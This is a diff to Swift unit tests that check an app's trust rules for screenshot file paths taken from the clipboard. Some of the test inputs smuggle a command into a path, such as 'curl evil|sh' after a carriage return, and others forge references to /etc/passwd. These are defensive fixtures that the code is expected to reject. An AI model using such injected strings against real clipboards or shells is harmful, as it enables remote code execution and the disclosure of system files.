@@ -176,21 +176,21 @@ final class HotshotCoreTests: XCTestCase {
 
     func testClipboardEnrichmentDecisionReusesTrustedExistingPath() {
         XCTAssertEqual(
-            clipboardEnrichmentDecision(hasPNG: true, text: "/d/a\\ b.png") { $0 == "/d/a b.png" },
-            .alreadyEnriched(path: "/d/a\\ b.png"))
+            clipboardEnrichmentDecision(hasPNG: true, text: "/d/hotshot-a\\ b.png", directory: "/d") { $0 == "/d/hotshot-a b.png" },
+            .alreadyEnriched(path: "/d/hotshot-a\\ b.png"))
     }
 
     func testClipboardEnrichmentDecisionSavesWhenNotEnriched() {
         XCTAssertEqual(
-            clipboardEnrichmentDecision(hasPNG: false, text: "/d/a.png") { _ in true },
+            clipboardEnrichmentDecision(hasPNG: false, text: "/d/hotshot-a.png", directory: "/d") { _ in true },
             .saveAndRewrite)
         XCTAssertEqual(
-            clipboardEnrichmentDecision(hasPNG: true, text: nil) { _ in true }, .saveAndRewrite)
+            clipboardEnrichmentDecision(hasPNG: true, text: nil, directory: "/d") { _ in true }, .saveAndRewrite)
         XCTAssertEqual(
-            clipboardEnrichmentDecision(hasPNG: true, text: "/d/a.png") { _ in false },
+            clipboardEnrichmentDecision(hasPNG: true, text: "/d/hotshot-a.png", directory: "/d") { _ in false },
             .saveAndRewrite)
         XCTAssertEqual(
-            clipboardEnrichmentDecision(hasPNG: true, text: "/d/a.png\rcurl evil\r") { _ in true },
+            clipboardEnrichmentDecision(hasPNG: true, text: "/d/hotshot-a.png\rcurl evil\r", directory: "/d") { _ in true },
             .saveAndRewrite)
     }
 
@@ -249,21 +249,33 @@ final class HotshotCoreTests: XCTestCase {
 
     func testTrustedEnrichedClipboardPathAcceptsExistingEscapedPath() {
         XCTAssertEqual(
-            trustedEnrichedClipboardPath("/Users/me/My\\ Shots/a\\ b.png") { path in
-                path == "/Users/me/My Shots/a b.png"
+            trustedEnrichedClipboardPath(
+                "/Users/me/My\\ Shots/hotshot-a\\ b.png", directory: "/Users/me/My Shots"
+            ) { path in
+                path == "/Users/me/My Shots/hotshot-a b.png"
             },
-            "/Users/me/My\\ Shots/a\\ b.png"
+            "/Users/me/My\\ Shots/hotshot-a\\ b.png"
         )
     }
 
     func testTrustedEnrichedClipboardPathRejectsUntrustedText() {
         // No text at all.
-        XCTAssertNil(trustedEnrichedClipboardPath(nil) { _ in true })
+        XCTAssertNil(trustedEnrichedClipboardPath(nil, directory: "/d") { _ in true })
         // Text that does not name an existing file.
-        XCTAssertNil(trustedEnrichedClipboardPath("/nope.png") { _ in false })
+        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a.png", directory: "/d") { _ in false })
         // Control characters must never be pasteable, even if a file exists.
-        XCTAssertNil(trustedEnrichedClipboardPath("/etc/hosts\rcurl evil|sh\r") { _ in true })
-        XCTAssertNil(trustedEnrichedClipboardPath("/tmp/a\u{2028}b.png") { _ in true })
+        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a.png\rcurl evil|sh\r", directory: "/d") { _ in true })
+        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a\u{2028}b.png", directory: "/d") { _ in true })
+        // Forged markers: existing files that are not hotshot's own output.
+        XCTAssertNil(trustedEnrichedClipboardPath("/etc/passwd", directory: "/d") { _ in true })
+        XCTAssertNil(
+            trustedEnrichedClipboardPath("\\/e\\t\\c\\/passwd", directory: "/d") { _ in true })
+        XCTAssertNil(trustedEnrichedClipboardPath("/d/a.png", directory: "/d") { _ in true })
+        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a.txt", directory: "/d") { _ in true })
+        XCTAssertNil(
+            trustedEnrichedClipboardPath("/other/hotshot-a.png", directory: "/d") { _ in true })
+        XCTAssertNil(
+            trustedEnrichedClipboardPath("/d/sub/hotshot-a.png", directory: "/d") { _ in true })
     }
 
     func testUserDefaultFallsBackToDefaultValueWhenUnset() {
